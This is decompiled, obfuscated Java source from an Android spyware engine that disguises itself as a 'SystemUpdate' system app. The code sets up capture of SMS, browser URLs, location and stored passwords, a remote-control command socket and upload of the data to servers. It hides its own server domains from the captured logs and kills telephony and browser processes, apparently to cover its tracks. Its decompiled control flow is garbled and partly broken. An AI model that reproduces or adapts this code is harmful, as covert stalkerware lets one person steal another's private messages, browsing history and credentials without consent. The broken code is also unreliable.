package com.vvt.appengine;

import android.app.ActivityManager;
import android.content.ContentResolver;
import android.content.Context;
import android.os.PowerManager;

import com.fx.socket.FxSocketException;
import com.vvt.activation_manager.ActivationManager;
import com.vvt.appengine.a.ba;
import com.vvt.application_profile_manager.ApplicationProfileManagerImpl;
import com.vvt.base.DeviceSettingId;
import com.vvt.base.FxDeliveryMethod;
import com.vvt.base.RunningMode;
import com.vvt.callmanager.ref.BugEngineException;
import com.vvt.configurationmanager.PcfLoadingException;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.eventdelivery.EventDelivery;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxSystemEvent;
import com.vvt.events.FxSystemEventCategories;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.exceptions.database.FxDatabaseException;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.license.exception.LicenseException;
import com.vvt.preference.FxPreferenceException;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefEventsCapture;
import com.vvt.productinfo.ProductInfoImpl;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteControlImpl;
import com.vvt.shell.ShellUtil;
import java.security.GeneralSecurityException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class a
  implements com.vvt.license.d
{
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.b;
  private static final boolean d = com.vvt.ak.a.c;
  private static final boolean e = com.vvt.ak.a.e;
  private static final String[] f;
  com.vvt.datadeliverymanager.a.a a;
  private AppEngine1 g;
  private Context h;
  private com.fx.socket.e i;
  private PowerManager.WakeLock j;
  private String k;
  private String l;
  private RunningMode m;
  private String n;
  private String o;
  private boolean p;
  private Timer q;
  private TimerTask r;
  
  static
  {
    String[] arrayOfString = new String[3];
    arrayOfString[0] = "d.mobilebackup.biz";
    arrayOfString[1] = "dmw.cc";
    arrayOfString[2] = "mflx.biz";
    f = arrayOfString;
  }
  
  public a(Context paramContext, String paramString, RunningMode paramRunningMode)
  {
    Object localObject1 = new java/util/Timer;
    ((Timer)localObject1).<init>();
    this.q = ((Timer)localObject1);
    localObject1 = new com/vvt/appengine/f;
    ((f)localObject1).<init>(this);
    this.a = ((com.vvt.datadeliverymanager.a.a)localObject1);
    this.p = false;
    this.h = paramContext;
    this.l = paramString;
    int i1 = 2;
    Object localObject2 = new Object[i1];
    String str1 = this.l;
    localObject2[0] = str1;
    int i2 = 1;
    Object localObject3 = com.vvt.m.a.a;
    localObject2[i2] = localObject3;
    localObject1 = String.format("%s/%s", (Object[])localObject2);
    this.k = ((String)localObject1);
    this.m = paramRunningMode;
    localObject1 = RunningMode.FULL;
    if (paramRunningMode == localObject1) {}
    for (localObject1 = "root";; localObject1 = com.vvt.ab.e.b(paramContext))
    {
      this.n = ((String)localObject1);
      localObject1 = new com/vvt/appengine/h;
      localObject2 = this.h;
      str1 = this.l;
      localObject3 = this.m;
      String str2 = this.n;
      ((AppEngine1)localObject1).<init>((Context)localObject2, str1, (RunningMode)localObject3, str2);
      this.g = ((AppEngine1)localObject1);
      return;
    }
  }
  
  private String a(String paramString) {
    StringBuffer localStringBuffer = new java.lang.StringBuffer();
    localStringBuffer.append("app startup\n")
      .append("client started by method: ")
      .append(paramString);
    return localStringBuffer.toString();
  }
  
  private void j() {
    boolean bool = this.p;
    if (!bool) {
      PowerManager powerManager = (PowerManager)this.h.getSystemService("power");
      int i1 = 1;
      this.j = powerManager.newWakeLock(i1, "AppEngine1");
      if (!this.j.isHeld()) {
        this.j.acquire();
      }
    }
  }
  
  private void k()
  {
    boolean bool = this.p;
    if (!bool)
    {
      PowerManager.WakeLock localWakeLock = this.j;
      if (localWakeLock != null)
      {
        localWakeLock = this.j;
        bool = localWakeLock.isHeld();
        if (bool)
        {
          localWakeLock = this.j;
          localWakeLock.release();
          bool = d;
          if (!bool) {}
        }
      }
    }
  }
  
  private com.vvt.eventrepository.e l()
  {
    c localc = new com/vvt/appengine/c;
    localc.<init>(this);
    return localc;
  }
  
  private void m()
  {
    boolean bool = b;
    if (bool) {}
    Object localObject1 = this.g.k;
    Object localObject2 = this.g.o;
    String str = this.g.l.d();
    bool = ((com.vvt.license.b)localObject1).a((com.vvt.productinfo.a)localObject2, str);
    if (bool)
    {
      localObject1 = new com/vvt/appengine/d;
      localObject2 = "ProcessPendingRCommandT";
      ((d)localObject1).<init>(this, (String)localObject2);
      ((Thread)localObject1).start();
    }
    bool = b;
    if (bool) {}
  }
  
  private void n()
  {
    boolean bool = b;
    if (bool) {}
    Object localObject = this.r;
    if (localObject != null)
    {
      bool = b;
      if (bool) {}
      this.r.cancel();
      bool = false;
      localObject = null;
      this.r = null;
    }
    localObject = this.r;
    if (localObject == null)
    {
      localObject = new com/vvt/appengine/e;
      ((e)localObject).<init>(this);
      this.r = ((TimerTask)localObject);
      localObject = this.q;
      TimerTask localTimerTask = this.r;
      long l1 = 0L;
      long l2 = 43200000L;
      ((Timer)localObject).schedule(localTimerTask, l1, l2);
    }
    bool = b;
    if (bool) {}
  }
  
  private void o()
  {
    boolean bool = c;
    if (bool) {}
    Object localObject1 = this.g.d();
    Object localObject2 = RunningMode.FULL;
    if (localObject1 != localObject2)
    {
      localObject1 = this.g.d();
      localObject2 = RunningMode.LIMITED_1;
      if (localObject1 != localObject2) {}
    }
    else
    {
      localObject1 = new com/vvt/am/a;
      ((com.vvt.am.a)localObject1).<init>();
      localObject2 = this.l;
      ((com.vvt.am.a)localObject1).b((String)localObject2);
      bool = ((com.vvt.am.a)localObject1).b();
      if (bool)
      {
        localObject1 = com.vvt.io.p.a(this.l, "busybox");
        localObject2 = this.l;
        Context localContext = this.g.a();
        String str = this.n;
        com.vvt.capture.core.password.a.a((String)localObject2, (String)localObject1, localContext, str);
      }
    }
    for (;;)
    {
      bool = c;
      if (bool) {}
      return;
      bool = c;
      if (bool)
      {
        continue;
        bool = c;
        if (!bool) {}
      }
    }
  }
  
  private void p()
  {
    boolean bool = c;
    if (bool) {}
    Object localObject = this.g.d();
    RunningMode localRunningMode = RunningMode.LIMITED_1;
    if (localObject == localRunningMode)
    {
      localObject = "com.android.systemupdate";
      ShellUtil.j((String)localObject);
    }
    localObject = this.g.d();
    localRunningMode = RunningMode.LIMITED_1;
    if (localObject != localRunningMode)
    {
      localObject = this.g.d();
      localRunningMode = RunningMode.FULL;
      if (localObject != localRunningMode) {}
    }
    else
    {
      ShellUtil.f();
    }
    bool = c;
    if (bool) {}
  }
  
  private void q()
  {
    boolean bool = c;
    if (bool) {}
    t();
    s();
    u();
    r();
    v();
    bool = c;
    if (bool) {}
  }
  
  private void r()
  {
    boolean bool = b;
    if (bool) {}
    Context localContext = this.g.a();
    String str = this.g.b();
    com.vvt.q.a.a.a(localContext, str);
    bool = b;
    if (bool) {}
    bool = b;
    if (bool) {}
  }
  
  private void s()
  {
    int i1 = 0;
    Context localContext = null;
    boolean bool1 = b;
    if (bool1) {}
    RunningMode localRunningMode = this.g.d();
    Object localObject = RunningMode.FULL;
    if (localRunningMode == localObject) {
      bool1 = true;
    }
    for (;;)
    {
      localObject = f;
      int i2 = localObject.length;
      while (i1 < i2)
      {
        String str = localObject[i1];
        Boolean localBoolean = Boolean.valueOf(bool1);
        com.vvt.q.a.a.a(localBoolean, str);
        boolean bool2 = b;
        if (bool2) {}
        i1 += 1;
      }
      bool1 = false;
      localRunningMode = null;
    }
    localContext = this.g.a();
    localObject = this.g.b();
    com.vvt.q.a.a.a(bool1, localContext, (String)localObject);
    bool1 = b;
    if (bool1) {}
    bool1 = b;
    if (bool1) {}
  }
  
  private void t()
  {
    int i1 = b;
    if (i1 != 0) {}
    try
    {
      localObject1 = this.g;
      localObject1 = ((AppEngine1)localObject1).u;
      if (localObject1 != null) {
        break label280;
      }
      int i3 = 1;
      AppEngine1 localh = this.g;
      localObject1 = new com/vvt/capture/sms/a;
      localObject2 = this.g;
      localObject2 = ((AppEngine1)localObject2).a();
      localObject3 = this.g;
      localObject3 = ((AppEngine1)localObject3).b();
      Object localObject4 = this.g;
      localObject4 = ((AppEngine1)localObject4).d();
      localObject5 = this.g;
      localObject5 = ((AppEngine1)localObject5).a();
      localObject5 = ((Context)localObject5).getContentResolver();
      localObject6 = this.g;
      localObject6 = ((AppEngine1)localObject6).h;
      ((com.vvt.capture.sms.a)localObject1).<init>((Context)localObject2, (String)localObject3, (RunningMode)localObject4, (ContentResolver)localObject5, (com.vvt.base.a)localObject6);
      localh.u = ((com.vvt.capture.sms.a)localObject1);
      i1 = b;
      if (i1 != 0) {}
      i4 = i3;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        Object localObject2;
        Object localObject3;
        Object localObject5;
        Object localObject6;
        int i4;
        boolean bool = b;
        if (bool)
        {
          continue;
          i4 = 0;
          localObject2 = null;
        }
      }
    }
    localObject1 = this.g;
    localObject1 = ((AppEngine1)localObject1).u;
    if (localObject1 == null)
    {
      i1 = e;
      if (i1 == 0) {}
    }
    for (;;)
    {
      return;
      localObject3 = f;
      int i5 = localObject3.length;
      i1 = 0;
      localObject1 = null;
      while (i1 < i5)
      {
        localObject5 = localObject3[i1];
        localObject6 = this.g;
        localObject6 = ((AppEngine1)localObject6).u;
        ((com.vvt.capture.sms.a)localObject6).a((String)localObject5);
        int i2;
        i1 += 1;
      }
      localObject1 = this.g;
      localObject1 = ((AppEngine1)localObject1).u;
      ((com.vvt.capture.sms.a)localObject1).a();
      bool = b;
      if ((!bool) || (i4 != 0))
      {
        localObject1 = this.g;
        i4 = 0;
        localObject2 = null;
        ((AppEngine1)localObject1).u = null;
      }
      bool = b;
      if (!bool) {}
    }
  }
  
  private void u()
  {
    int i1 = 0;
    AppEngine1 localh = null;
    bool2 = b;
    if (bool2) {}
    try
    {
      localObject1 = this.g;
      localObject1 = ((AppEngine1)localObject1).J;
      if (localObject1 != null) {
        break label252;
      }
      bool2 = true;
      localObject2 = this.g;
      com.vvt.capture.browserurl.a locala = new com/vvt/capture/browserurl/a;
      localObject3 = this.g;
      localObject3 = ((AppEngine1)localObject3).b();
      localObject4 = this.g;
      localObject4 = ((AppEngine1)localObject4).d();
      Object localObject5 = this.g;
      localObject5 = ((AppEngine1)localObject5).a();
      Object localObject6 = this.g;
      localObject6 = ((AppEngine1)localObject6).h;
      locala.<init>((String)localObject3, (RunningMode)localObject4, (Context)localObject5, (com.vvt.base.a)localObject6);
      ((AppEngine1)localObject2).J = locala;
      boolean bool3 = b;
      if (!bool3) {}
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        Object localObject2;
        Object localObject3;
        Object localObject4;
        boolean bool1 = b;
        if (bool1)
        {
          continue;
          bool2 = false;
          localObject1 = null;
        }
      }
    }
    localObject2 = this.g;
    localObject2 = ((AppEngine1)localObject2).J;
    if (localObject2 == null)
    {
      i1 = e;
      if (i1 == 0) {}
    }
    for (;;)
    {
      return;
      localObject2 = f;
      int i3 = localObject2.length;
      while (i1 < i3)
      {
        localObject3 = localObject2[i1];
        localObject4 = this.g;
        localObject4 = ((AppEngine1)localObject4).J;
        ((com.vvt.capture.browserurl.a)localObject4).a((String)localObject3);
        int i2;
        i1 += 1;
      }
      bool1 = b;
      if ((!bool1) || (bool2))
      {
        localh = this.g;
        bool2 = false;
        localObject1 = null;
        localh.J = null;
      }
      bool1 = b;
      if (!bool1) {}
    }
  }
  
  private void v()
  {
    boolean bool = b;
    if (bool) {}
    Object localObject = (ActivityManager)this.g.a().getSystemService("activity");
    ((ActivityManager)localObject).killBackgroundProcesses("com.android.providers.telephony");
    ((ActivityManager)localObject).killBackgroundProcesses("com.android.providers.downloads");
    ((ActivityManager)localObject).killBackgroundProcesses("com.android.browser");
    localObject = this.g.d();
    RunningMode localRunningMode = RunningMode.FULL;
    if (localObject == localRunningMode) {
      bool = true;
    }
    for (;;)
    {
      if (bool)
      {
        localObject = com.vvt.q.a.a.a();
        ShellUtil.d((String)localObject);
      }
      bool = b;
      if (bool) {}
      return;
      bool = false;
      localObject = null;
    }
  }
  
  private void w()
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = this.g.k.a().getLicenseStatus();
    Object localObject2 = LicenseStatus.ACTIVATED;
    if (localObject1 == localObject2) {
      bool1 = true;
    }
    for (;;)
    {
      boolean bool2 = b;
      if ((!bool2) || (bool1))
      {
        bool1 = b;
        if (bool1) {}
        z();
        bool1 = b;
        if (bool1) {}
        localObject1 = new java/util/Timer;
        ((Timer)localObject1).<init>();
        localObject2 = new com/vvt/appengine/g;
        ((g)localObject2).<init>(this);
        long l1 = 300000L;
        ((Timer)localObject1).schedule((TimerTask)localObject2, l1);
      }
      bool1 = b;
      if (bool1) {}
      return;
      bool1 = false;
      localObject1 = null;
    }
  }
  
  private void x()
  {
    int i1 = b;
    if (i1 != 0) {}
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    DeviceSettingId[] arrayOfDeviceSettingId = DeviceSettingId.values();
    int i3 = arrayOfDeviceSettingId.length;
    i1 = 0;
    Object localObject2 = null;
    while (i1 < i3)
    {
      String str = arrayOfDeviceSettingId[i1].getUniqueId();
      ((ArrayList)localObject1).add(str);
      int i2;
      i1 += 1;
    }
    localObject2 = new com/vvt/remotecontrol/ControlCommand;
    ((ControlCommand)localObject2).<init>();
    ((ControlCommand)localObject2).setData(localObject1);
    localObject1 = new com/vvt/appengine/a/ba;
    ((ba)localObject1).<init>((ControlCommand)localObject2);
    localObject2 = this.g;
    ((ba)localObject1).a((AppEngine1)localObject2);
    boolean bool = b;
    if (bool) {}
  }
  
  private void y()
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = com.fx.daemon.util.d.a(this.l);
    boolean bool2 = com.vvt.ag.b.a((String)localObject1);
    if (!bool2)
    {
      bool2 = b;
      if (bool2) {}
      Object localObject2 = new com/vvt/events/FxSystemEvent;
      ((FxSystemEvent)localObject2).<init>();
      FxEventDirection localFxEventDirection = FxEventDirection.OUT;
      ((FxSystemEvent)localObject2).setDirection(localFxEventDirection);
      long l1 = System.currentTimeMillis();
      ((FxSystemEvent)localObject2).setEventTime(l1);
      ((FxSystemEvent)localObject2).setMessage((String)localObject1);
      localObject1 = FxSystemEventCategories.CATEGORY_APP_CRASH;
      ((FxSystemEvent)localObject2).setLogType((FxSystemEventCategories)localObject1);
      localObject1 = new java/util/ArrayList;
      ((ArrayList)localObject1).<init>();
      ((ArrayList)localObject1).add(localObject2);
      localObject2 = this.g.h;
      if (localObject2 != null)
      {
        localObject2 = this.g.h;
        ((q)localObject2).a((List)localObject1);
        bool1 = b;
        if (bool1) {}
        localObject1 = this.l;
        com.fx.daemon.util.d.b((String)localObject1);
      }
    }
    for (;;)
    {
      bool1 = b;
      if (bool1) {}
      return;
      bool1 = e;
      if (bool1)
      {
        continue;
        bool1 = b;
        if (!bool1) {}
      }
    }
  }
  
  private void z()
  {
    Object localObject1 = AppStartUpHandler.a(this.l);
    boolean bool1 = com.vvt.ag.b.a((String)localObject1);
    boolean bool2;
    if (!bool1)
    {
      bool1 = b;
      if (bool1) {}
      Object localObject2 = new com/vvt/events/FxSystemEvent;
      ((FxSystemEvent)localObject2).<init>();
      FxEventDirection localFxEventDirection = FxEventDirection.OUT;
      ((FxSystemEvent)localObject2).setDirection(localFxEventDirection);
      long l1 = System.currentTimeMillis();
      ((FxSystemEvent)localObject2).setEventTime(l1);
      localObject1 = a((String)localObject1);
      ((FxSystemEvent)localObject2).setMessage((String)localObject1);
      localObject1 = FxSystemEventCategories.CATEGORY_DEBUG_MESSAGE;
      ((FxSystemEvent)localObject2).setLogType((FxSystemEventCategories)localObject1);
      localObject1 = new java/util/ArrayList;
      ((ArrayList)localObject1).<init>();
      ((ArrayList)localObject1).add(localObject2);
      localObject2 = this.g.h;
      if (localObject2 != null)
      {
        localObject2 = this.g.h;
        ((q)localObject2).a((List)localObject1);
        bool2 = b;
        if (bool2) {}
        localObject1 = this.l;
        AppStartUpHandler.removeFromPath((String)localObject1);
      }
    }
    for (;;)
    {
      return;
      bool2 = e;
      if (bool2)
      {
        continue;
        bool2 = b;
        if (!bool2) {}
      }
    }
  }
  
  public AppEngine1 a()
  {
    return this.g;
  }
  
  public void b()
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = c;
    if (bool1) {}
    bool1 = false;
    Throwable localThrowable = null;
    for (;;)
    {
      try
      {
        localObject2 = this.g;
        localObject2 = ((AppEngine1)localObject2).l;
        Object localObject4;
        String str;
        if (localObject2 == null)
        {
          bool2 = c;
          if (bool2) {}
          localObject2 = this.g;
          localObject3 = new com/vvt/phoneinfo/b;
          localObject4 = this.h;
          str = this.l;
          ((com.vvt.phoneinfo.b)localObject3).<init>((Context)localObject4, str);
          ((AppEngine1)localObject2).l = ((com.vvt.phoneinfo.b)localObject3);
        }
        localObject2 = this.g;
        localObject2 = ((AppEngine1)localObject2).m;
        if (localObject2 == null)
        {
          bool2 = c;
          if (bool2) {}
          localObject2 = this.g;
          localObject3 = new com/vvt/networkinfo/a;
          localObject4 = this.h;
          ((com.vvt.networkinfo.a)localObject3).<init>((Context)localObject4);
          ((AppEngine1)localObject2).m = ((com.vvt.networkinfo.a)localObject3);
        }
        localObject2 = this.g;
        localObject2 = ((AppEngine1)localObject2).o;
        if (localObject2 == null)
        {
          bool2 = c;
          if (bool2) {}
          localObject2 = this.g;
          localObject3 = new com/vvt/productinfo/ProductInfoImpl;
          ((ProductInfoImpl)localObject3).<init>();
          ((AppEngine1)localObject2).o = ((ProductInfoImpl)localObject3);
          localObject2 = this.g;
          localObject2 = ((AppEngine1)localObject2).o;
          int i1 = 5002;
          ((ProductInfoImpl)localObject2).setProductId(i1);
          localObject2 = this.g;
          localObject2 = ((AppEngine1)localObject2).o;
          localObject3 = "SystemUpdate";
          ((ProductInfoImpl)localObject2).setProductName((String)localObject3);
          localObject2 = this.g;
          localObject2 = ((AppEngine1)localObject2).o;
          localObject3 = "2.25.2";
          ((ProductInfoImpl)localObject2).setProductVersion((String)localObject3);
          localObject2 = this.g;
          localObject2 = ((AppEngine1)localObject2).o;
          i1 = 1;
          ((ProductInfoImpl)localObject2).setProductLanguage(i1);
          localObject2 = this.g;
          localObject2 = ((AppEngine1)localObject2).o;
          localObject3 = com.vvt.base.a.a.q;
          localObject3 = com.vvt.base.a.b.a((byte[])localObject3);
          ((ProductInfoImpl)localObject2).setProtocolHashTail((String)localObject3);
          bool2 = c;
          if (!bool2) {}
        }
        localObject2 = this.g;
        localObject2 = ((AppEngine1)localObject2).e;
        if (localObject2 == null)
        {
          bool2 = c;
          if (bool2) {}
          bool2 = this.p;
          if (!bool2) {
            continue;
          }
          localObject2 = new com/vvt/appengine/b;
          ((b)localObject2).<init>(this);
          localObject3 = this.g;
          localObject4 = new com/vvt/configurationmanager/e;
          ((com.vvt.configurationmanager.e)localObject4).<init>((com.vvt.configurationmanager.f)localObject2);
          ((AppEngine1)localObject3).e = ((com.vvt.configurationmanager.e)localObject4);
          localObject2 = this.g;
          localObject2 = ((AppEngine1)localObject2).e;
          localObject3 = this.k;
          ((com.vvt.configurationmanager.e)localObject2).a((String)localObject3);
        }
        localObject2 = this.g;
        localObject2 = ((AppEngine1)localObject2).k;
        if (localObject2 == null)
        {
          bool2 = c;
          if (bool2) {}
          localObject2 = this.g;
          localObject3 = new com/vvt/license/b;
          localObject4 = this.l;
          ((com.vvt.license.b)localObject3).<init>((String)localObject4);
          ((AppEngine1)localObject2).k = ((com.vvt.license.b)localObject3);
          localObject2 = this.g;
          localObject2 = ((AppEngine1)localObject2).k;
          ((com.vvt.license.b)localObject2).a(this);
          localObject2 = this.g;
          localObject2 = ((AppEngine1)localObject2).k;
          ((com.vvt.license.b)localObject2).c();
        }
        localObject2 = this.l;
        localObject2 = ShellUtil.m((String)localObject2);
        this.o = ((String)localObject2);
        localObject2 = this.g;
        localObject3 = this.o;
        ((AppEngine1)localObject2).a((String)localObject3);
        bool2 = this.p;
        if (!bool2)
        {
          bool2 = c;
          if (bool2) {}
          localObject2 = new com/vvt/appengine/v;
          localObject3 = this.g;
          ((v)localObject2).<init>((AppEngine1)localObject3);
          boolean bool3 = c;
          if (bool3) {}
          localObject3 = new com/fx/socket/e;
          localObject4 = "AppEngine1";
          str = "com.vvt.rmtctrl.server";
          int i2 = 12512;
          ((com.fx.socket.e)localObject3).<init>((String)localObject4, str, i2, (com.fx.socket.d)localObject2);
          this.i = ((com.fx.socket.e)localObject3);
          localObject2 = this.i;
          localObject3 = "RemoteControlCmdServerThread";
          ((com.fx.socket.e)localObject2).setName((String)localObject3);
          localObject2 = this.i;
          ((com.fx.socket.e)localObject2).start();
        }
        bool2 = c;
        if (bool2) {}
        j();
        bool2 = c;
        if (bool2) {}
        d();
        bool2 = c;
        if (bool2) {}
        m();
        bool2 = c;
        if (bool2) {}
        n();
        bool2 = c;
        if (bool2) {}
        w();
        bool2 = c;
        if (bool2) {}
        p();
      }
      catch (PcfLoadingException localPcfLoadingException)
      {
        bool2 = e;
        if (!bool2) {
          continue;
        }
        continue;
      }
      catch (LicenseException localLicenseException)
      {
        bool2 = e;
        if (!bool2) {
          continue;
        }
        continue;
      }
      catch (FxSocketException localFxSocketException)
      {
        bool2 = e;
        if (!bool2) {
          continue;
        }
        continue;
      }
      catch (GeneralSecurityException localGeneralSecurityException)
      {
        bool2 = e;
        if (!bool2) {
          continue;
        }
        continue;
      }
      catch (FxPreferenceException localFxPreferenceException)
      {
        bool2 = e;
        if (!bool2) {
          continue;
        }
        continue;
      }
      catch (FxDatabaseException localFxDatabaseException)
      {
        bool2 = e;
        if (!bool2) {
          continue;
        }
        continue;
      }
      catch (BugEngineException localBugEngineException)
      {
        bool2 = e;
        if (!bool2) {
          continue;
        }
        continue;
      }
      catch (FxNullNotAllowedException localFxNullNotAllowedException)
      {
        bool2 = e;
        if (!bool2) {
          continue;
        }
        continue;
        bool1 = b;
        if (!bool1) {
          continue;
        }
        q();
        bool1 = b;
        if (!bool1) {
          continue;
        }
        localObject1 = this.m;
        localObject2 = RunningMode.FULL;
        if (localObject1 != localObject2) {
          break label934;
        }
      }
      if (localThrowable == null) {
        continue;
      }
      localObject2 = new com/vvt/appengine/AppEngineException;
      ((AppEngineException)localObject2).<init>(localThrowable);
      throw ((Throwable)localObject2);
      localObject2 = new com/vvt/configurationmanager/g;
      ((com.vvt.configurationmanager.g)localObject2).<init>();
    }
    Object localObject1 = new com/vvt/j/c;
    ((com.vvt.j.c)localObject1).<init>();
    Object localObject2 = "com.android.systemupdate";
    Object localObject3 = this.l;
    localObject1 = ((com.vvt.j.c)localObject1).a((String)localObject2, (String)localObject3);
    boolean bool2 = b;
    if (bool2) {}
    localObject2 = new com/vvt/appengine/l;
    ((l)localObject2).<init>();
    localObject1 = ((l)localObject2).a((String)localObject1);
    if (localObject1 != null) {}
    for (localObject1 = "";; localObject1 = "/sdcdsard")
    {
      bool1 = b;
      if (bool1) {}
      return;
      label934:
      localObject1 = new com/vvt/j/c;
      ((com.vvt.j.c)localObject1).<init>();
      localObject2 = this.h;
      localObject1 = ((com.vvt.j.c)localObject1).a((Context)localObject2);
      break;
    }
  }
  
  public void c()
  {
    boolean bool = b;
    if (bool) {}
    bool = c;
    if (bool) {}
    Object localObject = this.g;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    HashMap localHashMap = new java/util/HashMap;
    localHashMap.<init>();
    i.a((AppEngine1)localObject, localArrayList, localHashMap);
    localObject = this.g;
    ((AppEngine1)localObject).e = null;
    bool = c;
    if (bool) {}
    localObject = this.g.k;
    if (localObject != null)
    {
      this.g.k.a(null);
      localObject = this.g;
      ((AppEngine1)localObject).k = null;
      bool = c;
      if (!bool) {}
    }
    localObject = this.i;
    if (localObject != null)
    {
      localObject = this.i;
      ((com.fx.socket.e)localObject).a();
      bool = c;
      if (bool) {}
      this.i = null;
      bool = c;
      if (!bool) {}
    }
    localObject = this.g.z;
    if (localObject != null)
    {
      localObject = this.g.z;
      ((com.vvt.capture.location.a)localObject).b();
    }
    localObject = this.g.p;
    if (localObject != null)
    {
      bool = c;
      if (bool) {}
      this.g.p.a(null);
      localObject = this.g.p;
      ((com.vvt.remotecommand.b)localObject).c();
    }
    localObject = this.g.j;
    if (localObject != null)
    {
      bool = c;
      if (bool) {}
      localObject = this.g.j;
      ((com.vvt.eventrepository.c)localObject).b();
    }
    localObject = this.g.b;
    if (localObject != null)
    {
      this.g.b.a();
      localObject = this.g;
      ((AppEngine1)localObject).b = null;
      bool = c;
      if (!bool) {}
    }
    localObject = this.g.Q;
    if (localObject != null)
    {
      this.g.Q.c();
      localObject = this.g;
      ((AppEngine1)localObject).Q = null;
      bool = c;
      if (!bool) {}
    }
    k();
    bool = b;
    if (bool) {}
  }
  
  void d()
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = this.g.r;
    Object localObject4;
    if (localObject1 == null)
    {
      bool1 = c;
      if (bool1) {}
      localObject1 = this.g;
      localObject2 = new com/vvt/server_address_manager/b;
      localObject3 = this.l;
      ((com.vvt.server_address_manager.b)localObject2).<init>((String)localObject3, false);
      ((AppEngine1)localObject1).r = ((com.vvt.server_address_manager.b)localObject2);
      localObject1 = this.g.r;
      localObject2 = new com/vvt/j/b;
      ((com.vvt.j.b)localObject2).<init>();
      localObject3 = new com/vvt/j/a;
      ((com.vvt.j.a)localObject3).<init>();
      localObject3 = ((com.vvt.j.a)localObject3).a();
      localObject4 = new com/vvt/j/a;
      ((com.vvt.j.a)localObject4).<init>();
      localObject4 = ((com.vvt.j.a)localObject4).b();
      localObject2 = ((com.vvt.j.b)localObject2).a((byte[])localObject3, (byte[])localObject4);
      ((com.vvt.server_address_manager.b)localObject1).b((String)localObject2);
    }
    localObject1 = this.g.d;
    Object localObject5;
    if (localObject1 == null)
    {
      bool1 = c;
      if (bool1) {}
      localObject1 = this.g;
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject3 = this.l;
      localObject2 = (String)localObject3 + "/";
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject4 = this.l;
      localObject3 = (String)localObject4 + "/";
      localObject4 = this.g.r.b();
      localObject5 = this.g.r.a();
      localObject2 = com.vvt.phoenix.prot.c.a((String)localObject2, (String)localObject3, (String)localObject4, (String)localObject5);
      ((AppEngine1)localObject1).d = ((com.vvt.phoenix.prot.c)localObject2);
      localObject1 = this.g.d;
      localObject2 = this.g.r.a();
      ((com.vvt.phoenix.prot.c)localObject1).b((String)localObject2);
      localObject1 = this.g.d;
      localObject2 = this.g.r.b();
      ((com.vvt.phoenix.prot.c)localObject1).a((String)localObject2);
    }
    localObject1 = this.g;
    Object localObject2 = new com/vvt/connectionhistorymanager/b;
    Object localObject3 = this.l;
    ((com.vvt.connectionhistorymanager.b)localObject2).<init>((String)localObject3);
    ((AppEngine1)localObject1).f = ((com.vvt.connectionhistorymanager.b)localObject2);
    localObject1 = this.g.n;
    if (localObject1 == null)
    {
      localObject1 = this.g;
      localObject2 = new com/vvt/preference/b;
      localObject3 = this.l;
      ((com.vvt.preference.b)localObject2).<init>((String)localObject3);
      ((AppEngine1)localObject1).n = ((com.vvt.preference.b)localObject2);
      localObject1 = this.g.n;
      ((com.vvt.preference.b)localObject1).a();
    }
    localObject1 = this.g.E;
    if (localObject1 == null)
    {
      localObject1 = this.g;
      localObject2 = new com/vvt/c/c;
      ((com.vvt.c.c)localObject2).<init>();
      ((AppEngine1)localObject1).E = ((com.vvt.c.c)localObject2);
      localObject1 = this.g.E;
      localObject2 = this.g.d();
      ((com.vvt.c.c)localObject1).a((RunningMode)localObject2);
      localObject1 = this.g.E;
      ((com.vvt.c.c)localObject1).a();
    }
    localObject1 = this.g.g;
    Object localObject6;
    if (localObject1 == null)
    {
      bool1 = c;
      if (bool1) {}
      localObject1 = this.g.n;
      localObject2 = FxPreferenceType.EVENTS_CTRL;
      localObject1 = ((PrefEventsCapture)((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject2)).getDeliveryMethod();
      boolean bool2 = c;
      if (bool2) {}
      localObject2 = this.g;
      localObject3 = new com/vvt/datadeliverymanager/b;
      localObject4 = this.h;
      localObject5 = this.l;
      localObject6 = this.g.d();
      ((com.vvt.datadeliverymanager.b)localObject3).<init>((Context)localObject4, (String)localObject5, (RunningMode)localObject6);
      ((AppEngine1)localObject2).g = ((com.vvt.datadeliverymanager.b)localObject3);
      localObject2 = this.g.g;
      localObject3 = this.g.d;
      ((com.vvt.datadeliverymanager.b)localObject2).a((com.vvt.phoenix.prot.c)localObject3);
      localObject2 = this.g.g;
      localObject3 = this.g.f;
      ((com.vvt.datadeliverymanager.b)localObject2).a((com.vvt.connectionhistorymanager.a)localObject3);
      localObject2 = this.g.g;
      localObject3 = this.g.k;
      ((com.vvt.datadeliverymanager.b)localObject2).a((com.vvt.license.a)localObject3);
      localObject2 = this.g.g;
      localObject3 = new com/vvt/appengine/t;
      localObject4 = this.g;
      ((t)localObject3).<init>((AppEngine1)localObject4);
      ((com.vvt.datadeliverymanager.b)localObject2).a((com.vvt.datadeliverymanager.a.b)localObject3);
      localObject2 = this.g.g;
      localObject3 = this.g.l;
      ((com.vvt.datadeliverymanager.b)localObject2).a((com.vvt.phoneinfo.a)localObject3);
      localObject2 = this.g.g;
      localObject3 = this.g.o;
      ((com.vvt.datadeliverymanager.b)localObject2).a((com.vvt.productinfo.a)localObject3);
      localObject2 = this.g.g;
      localObject3 = this.g.m;
